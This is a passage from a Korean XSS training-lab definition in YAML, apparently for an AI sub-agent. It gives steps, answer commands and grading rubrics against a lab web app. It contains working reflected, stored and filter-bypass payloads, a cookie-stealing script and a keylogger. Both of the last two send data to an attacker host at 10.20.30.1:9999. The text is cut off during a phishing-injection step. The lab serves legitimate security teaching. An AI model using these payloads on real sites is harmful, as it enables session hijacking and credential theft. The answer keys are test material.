lab_id: web-vuln-ai-week03
title: XSS(Cross-Site Scripting) 실습 (AI 지원)
version: ai
course: web-vuln-ai
week: 3
description: 반사형, 저장형, DOM 기반 XSS 공격의 원리와 방어 기법을 실습합니다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
difficulty: medium
duration_minutes: 120
objectives:
- 반사형/저장형/DOM XSS를 구분한다
- XSS 페이로드를 작성하고 테스트한다
- CSP 등 방어 기법을 이해한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: 대상 웹 애플리케이션(http://{{WEB_IP}})의 검색 기능에서 반사형 XSS를 테스트하시오.
  hint: URL 파라미터에 script 태그를 삽입하세요.
  category: xss_reflected
  points: 8
  answer: '🤖 프롬프트: 대상 웹 애플리케이션(http://10.20.30.80)의 검색 기능에서 반사형 XSS를 테스트해줘

    📎 참고 (CLI): curl -s ''http://10.20.30.80/#/search?q=<script>alert(1)</script>'' 2>/dev/null | head
    -20 && echo ''반사형 XSS 테스트 완료'''
  answer_detail: 반사형 XSS는 사용자 입력이 즉시 응답에 반영될 때 발생합니다.
  verify:
    type: output_contains
    expect: 반사형 XSS 테스트 완료
    field: stdout
    semantic:
      intent: 반사형 XSS 탐지 — 검색 파라미터에 script 태그 주입 후 응답에 그대로 반영되는지 확인
      success_criteria:
      - 검색 파라미터에 script 태그 또는 img onerror 주입
      - 응답 HTML 에서 주입 코드가 이스케이프 없이 반영되는지 확인
      - 반사형 XSS 판정 근거 제시
      acceptable_methods:
      - curl -G -d q=<script>alert(1)</script> 주입
      - Burp Repeater 로 파라미터 변조
      - 브라우저 dev tools 에서 DOM 검증
      - XSStrike 또는 dalfox 자동 탐지
      negative_signs:
      - 응답 검증 없이 단순 요청만
      - 반사 여부 판정 근거 없음
      - 이스케이프 처리된 응답을 XSS 로 오판
  target_vm: attacker
  script: curl -s 'http://10.20.30.80/#/search?q=<script>alert(1)</script>' 2>/dev/null | head -20 &&
    echo '반사형 XSS 테스트 완료'
  risk_level: low
  bastion_prompt: 대상 웹 애플리케이션(http://10.20.30.80)의 검색 기능에서 반사형 XSS를 테스트해줘
- order: 2
  instruction: '다양한 XSS 페이로드를 테스트하시오: img, svg, iframe 태그 활용.'
  hint: HTML 이벤트 핸들러를 사용하세요.
  category: xss_reflected
  points: 10
  answer: '🤖 프롬프트: 다양한 XSS 페이로드를 테스트하시오: img, svg, iframe 태그 활용해줘

    📎 참고 (CLI): curl -s ''http://10.20.30.80/#/search?q=<img src=x onerror=alert(1)>'' 2>/dev/null | head
    -10 && echo ''XSS 페이로드 테스트 완료'''
  answer_detail: 'img onerror, svg onload, iframe src=javascript: 등 다양한 벡터가 존재합니다.'
  verify:
    type: output_contains
    expect: XSS 페이로드 테스트 완료
    field: stdout
    semantic:
      intent: 다양한 XSS 페이로드 테스트 — img onerror, svg onload, iframe srcdoc 등 script 외 벡터
      success_criteria:
      - img/svg/iframe 중 2개 이상 페이로드 시도
      - 각 페이로드가 필터 우회 또는 실행되는지 응답 검증
      - 벡터별 차이(이벤트 핸들러 차이) 설명
      acceptable_methods:
      - img src=x onerror=alert(1) 주입
      - svg onload=alert(1) 주입
      - iframe srcdoc=&lt;script&gt;... 주입
      - body onload, input autofocus onfocus 등
      negative_signs:
      - script 태그 한 종류만
      - 벡터 차이 설명 없음
      - 페이로드 실행 여부 검증 없음
  target_vm: attacker
  script: curl -s 'http://10.20.30.80/#/search?q=<img src=x onerror=alert(1)>' 2>/dev/null | head -10
    && echo 'XSS 페이로드 테스트 완료'
  risk_level: low
  bastion_prompt: '다양한 XSS 페이로드를 테스트하시오: img, svg, iframe 태그 활용해줘'
- order: 3
  instruction: '저장형 XSS를 시도하시오: 상품 리뷰에 스크립트를 삽입.'
  hint: POST 요청으로 리뷰를 등록하세요.
  category: xss_stored
  points: 12
  answer: "\U0001F916 프롬프트: 저장형 XSS를 시도하시오: 상품 리뷰에 스크립트를 삽입해줘\n\U0001F4CE 참고 (CLI): curl -s -X POST http://10.20.30.80/api/Feedbacks\
    \ \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"comment\":\"<script>alert(document.cookie)</script>\"\
    ,\"rating\":5}' 2>/dev/null \\\n | head -10 && echo '저장형 XSS 테스트 완료'"
  answer_detail: 저장형 XSS는 DB에 저장되어 다른 사용자가 페이지를 볼 때마다 실행되므로 더 위험합니다.
  verify:
    type: output_contains
    expect: 저장형 XSS 테스트 완료
    field: stdout
    semantic:
      intent: 저장형 XSS — 리뷰·댓글 입력란에 페이로드 삽입 후 다른 사용자 조회 시 실행되는지 확인
      success_criteria:
      - 리뷰/댓글/프로필 등 저장 기능에 페이로드 POST
      - 저장 확인(GET 으로 페이지 재조회 후 페이로드 반영)
      - 저장형이 반사형보다 위험한 이유 설명
      acceptable_methods:
      - curl -X POST -d review=<payload> /submit
      - Burp Repeater 로 저장 요청 후 조회
      - python requests.post + 이후 get
      - JuiceShop review 엔드포인트
      negative_signs:
      - 저장 없이 반사만 시도
      - 재조회 단계 생략
      - 영향 범위(모든 방문자) 설명 없음
  target_vm: attacker
  script: "curl -s -X POST http://10.20.30.80/api/Feedbacks \\\n  -H 'Content-Type: application/json'\
    \ \\\n  -d '{\"comment\":\"<script>alert(document.cookie)</script>\",\"rating\":5}' 2>/dev/null \\\
    \n | head -10 && echo '저장형 XSS 테스트 완료'"
  risk_level: low
  bastion_prompt: '저장형 XSS를 시도하시오: 상품 리뷰에 스크립트를 삽입해줘'
- order: 4
  instruction: DOM 기반 XSS 취약점을 찾으시오.
  hint: JavaScript 소스에서 innerHTML, document.write, eval 등을 검색하세요.
  category: xss_dom
  points: 10
  answer: '🤖 프롬프트: DOM 기반 XSS 취약점을 찾으시오해줘

    📎 참고 (CLI): curl -s http://10.20.30.80 | grep -ioE ''(innerHTML|document\.write|eval\()'' | sort -u
    && echo ''DOM XSS 분석 완료'''
  answer_detail: DOM XSS는 서버 응답 없이 클라이언트 JavaScript에서 발생합니다.
  verify:
    type: output_contains
    expect: DOM XSS 분석 완료
    field: stdout
    semantic:
      intent: DOM 기반 XSS — location.hash, document.write, innerHTML 등 클라이언트 JS 가 사용자 입력을 DOM 에 반영하며 발생
      success_criteria:
      - document.location.hash 또는 URL fragment 로 페이로드 주입
      - JS 소스에서 취약 싱크(innerHTML, eval, document.write) 발견
      - 서버 응답에는 페이로드 없고 클라이언트에서만 실행되는 특성 설명
      acceptable_methods:
      - '#<payload> 를 URL fragment 에 넣고 브라우저 열기'
      - DOMinator 또는 DOM-Xss-Scanner 자동화
      - Chrome dev tools Breakpoint 로 싱크 추적
      - 소스 grep (innerHTML|document.write|eval)
      negative_signs:
      - 서버 반사 XSS 와 혼동
      - 클라이언트 JS 분석 없음
      - 싱크 위치 제시 없음
  target_vm: attacker
  script: curl -s http://10.20.30.80 | grep -ioE '(innerHTML|document\.write|eval\()' | sort -u && echo
    'DOM XSS 분석 완료'
  risk_level: low
  bastion_prompt: DOM 기반 XSS 취약점을 찾으시오해줘
- order: 5
  instruction: XSS로 쿠키를 탈취하는 페이로드를 작성하시오.
  hint: document.cookie를 외부로 전송하는 스크립트를 작성하세요.
  category: xss_exploit
  points: 10
  answer: '🤖 프롬프트: XSS로 쿠키를 탈취하는 페이로드를 구현 방법을 설명하고 예시 코드를 보여줘

    📎 참고 (CLI): echo ''<script>new Image().src="http://10.20.30.1:9999/steal?c="+document.cookie</script>''
    && echo ''쿠키 탈취 페이로드 작성 완료'''
  answer_detail: XSS로 세션 쿠키를 탈취하면 세션 하이재킹이 가능합니다.
  verify:
    type: output_contains
    expect: 쿠키 탈취 페이로드 작성 완료
    field: stdout
    semantic:
      intent: XSS 쿠키 탈취 — document.cookie 를 외부 서버로 전송하는 페이로드 (HttpOnly 없을 때 유효)
      success_criteria:
      - document.cookie 참조하는 페이로드 구성
      - fetch/Image 로 외부 endpoint 로 cookie 전송
      - HttpOnly 속성이 이 공격을 차단함을 언급
      acceptable_methods:
      - new Image().src=attacker/?c=+document.cookie
      - fetch(attacker, {method:POST, body:document.cookie})
      - navigator.sendBeacon 사용
      - XSSHunter 무료 서비스 이용
      negative_signs:
      - document.cookie 참조 없이 페이로드
      - 외부 전송 단계 없음
      - HttpOnly 언급 없음
  target_vm: attacker
  script: echo '<script>new Image().src="http://10.20.30.1:9999/steal?c="+document.cookie</script>' &&
    echo '쿠키 탈취 페이로드 작성 완료'
  risk_level: low
  bastion_prompt: XSS로 쿠키를 탈취하는 페이로드를 작성하시오.
- order: 6
  instruction: 'XSS 필터 우회 기법을 테스트하시오: 인코딩, 대소문자 혼합.'
  hint: HTML 엔티티, URL 인코딩을 활용하세요.
  category: xss_bypass
  points: 12
  answer: '🤖 프롬프트: XSS 필터 우회 기법을 테스트하시오: 인코딩, 대소문자 혼합해줘

    📎 참고 (CLI): echo ''대소문자: <ScRiPt>alert(1)</sCrIpT>'' && echo ''HTML 엔티티: &#60;script&#62;'' && echo
    ''XSS 우회 기법 테스트 완료'''
  answer_detail: 블랙리스트 기반 필터는 인코딩, 대소문자 혼합, 이벤트 핸들러 등으로 우회할 수 있습니다.
  verify:
    type: output_contains
    expect: XSS 우회 기법 테스트 완료
    field: stdout
    semantic:
      intent: XSS 필터 우회 — URL 인코딩, HTML 엔티티, 대소문자 혼합(ScRiPt), 이중 인코딩 등으로 WAF/입력 필터 회피
      success_criteria:
      - 최소 2가지 우회 기법(인코딩/대소문자 혼합) 페이로드 제시
      - 필터가 script 를 SCRIPT, scRipt 처럼 인식 못함을 실습
      - 방어(대소문자 무시 정규식, 화이트리스트) 언급
      acceptable_methods:
      - '%3Cscript%3E 같은 URL 인코딩'
      - '&lt;script&gt; HTML 엔티티'
      - ScRiPt, SvG 대소문자 혼합
      - ModSecurity CRS 규칙 확인
      negative_signs:
      - 우회 기법 1개만
      - 필터 회피 원리 설명 없음
      - 방어 누락
  target_vm: attacker
  script: 'echo ''대소문자: <ScRiPt>alert(1)</sCrIpT>'' && echo ''HTML 엔티티: &#60;script&#62;'' && echo ''XSS
    우회 기법 테스트 완료'''
  risk_level: low
  bastion_prompt: 'XSS 필터 우회 기법을 테스트하시오: 인코딩, 대소문자 혼합해줘'
- order: 7
  instruction: Content-Security-Policy(CSP) 헤더를 분석하시오.
  hint: 응답 헤더에서 CSP를 확인하세요.
  category: xss_defense
  points: 10
  answer: '🤖 프롬프트: Content-Security-Policy(CSP) 헤더를 분석해줘

    📎 참고 (CLI): curl -sI http://10.20.30.80 | grep -i ''content-security-policy'' && echo ''CSP 분석 완료''
    || echo ''CSP 미설정 확인 완료'''
  answer_detail: CSP는 인라인 스크립트 실행과 외부 리소스 로딩을 제한하여 XSS를 방어합니다.
  verify:
    type: output_contains
    expect: 완료
    field: stdout
    semantic:
      intent: CSP 헤더 분석 — default-src, script-src, unsafe-inline 등 정책 파싱 후 우회 가능성 평가
      success_criteria:
      - 응답의 Content-Security-Policy 헤더 수집
      - 주요 지시자(default-src, script-src, style-src) 해석
      - 'unsafe-inline·wildcard·data: 스킴 허용 등 약점 식별'
      acceptable_methods:
      - curl -I | grep -i content-security-policy
      - Google CSP Evaluator 제출
      - Mozilla Observatory 분석
      - browser dev tools Security 탭
      negative_signs:
      - CSP 존재 여부만 확인
      - 지시자 분석 없음
      - 우회 관점 없음
  target_vm: attacker
  script: curl -sI http://10.20.30.80 | grep -i 'content-security-policy' && echo 'CSP 분석 완료' || echo
    'CSP 미설정 확인 완료'
  risk_level: low
  bastion_prompt: Content-Security-Policy(CSP) 헤더를 분석해줘
- order: 8
  instruction: XSS를 이용한 키로거 시뮬레이션 페이로드를 작성하시오.
  hint: addEventListener로 키 입력을 캡처하세요.
  category: xss_exploit
  points: 10
  answer: '🤖 프롬프트: XSS를 이용한 키로거 시뮬레이션 페이로드를 구현 방법을 설명하고 예시 코드를 보여줘

    📎 참고 (CLI): echo ''<script>document.addEventListener("keypress",function(e){new Image().src="http://10.20.30.1:9999/log?k="+e.key})</script>''
    && echo ''키로거 페이로드 작성 완료'''
  answer_detail: XSS 키로거는 사용자의 패스워드, 신용카드 번호 등을 실시간으로 탈취할 수 있습니다.
  verify:
    type: output_contains
    expect: 키로거 페이로드 작성 완료
    field: stdout
    semantic:
      intent: XSS 키로거 — addEventListener keydown/keypress 로 키 입력을 캡처해 외부 서버로 전송하는 페이로드
      success_criteria:
      - document.addEventListener keydown 사용하는 JS 코드 제시
      - 키 입력을 외부 endpoint 로 전송(fetch/Image)
      - 방어(CSP script-src, Trusted Types) 언급
      acceptable_methods:
      - document.onkeypress = e => fetch(...)
      - document.addEventListener + Beacon API
      - XSSHunter payload
      - BeEF 프레임워크 hook
      negative_signs:
      - 키 캡처 없이 alert 만
      - 외부 전송 없음
      - 방어 기법 누락
  target_vm: attacker
  script: echo '<script>document.addEventListener("keypress",function(e){new Image().src="http://10.20.30.1:9999/log?k="+e.key})</script>'
    && echo '키로거 페이로드 작성 완료'
  risk_level: low
  bastion_prompt: XSS를 이용한 키로거 시뮬레이션 페이로드를 작성하시오.
- order: 9
  instruction: XSS를 이용한 피싱 페이지 삽입을 시뮬레이션하시오.
  hint: innerHTML로 가짜 로그인 폼을 삽입하세요.
  category: xss_exploit
  points: 10
  answer: '🤖 프롬프트: XSS를 이용한 피싱 페이지 삽입을 시뮬레이션해줘

    📎 참고 (CLI): echo ''피싱 페이로드: document.body.innerHTML에 가짜 로그인 폼 삽입'' && echo ''피싱 페이로드 작성 완료'''
  answer_detail: XSS 피싱은 원본 도메인에서 실행되므로 사용자가 의심하기 어렵습니다.
  verify:
    type: output_contains
    expect: 피싱 페이로드 작성 완료
    field: stdout
    semantic:
      intent: XSS 피싱 삽입 — 동일 도메인에 가짜 로그인 폼 삽입해 자격증명 탈취 (DOM 조작)
      success_criteria:
      - document.body.innerHTML 또는 appendChild 로 피싱 폼 삽입
      - 폼 submit 이벤트로 자격증명 가로채어 외부 전송
      - 동일 출처 피싱의 위험성·사용자 인지 한계 설명
      acceptable_methods:
      - document.body.innerHTML = <form>...
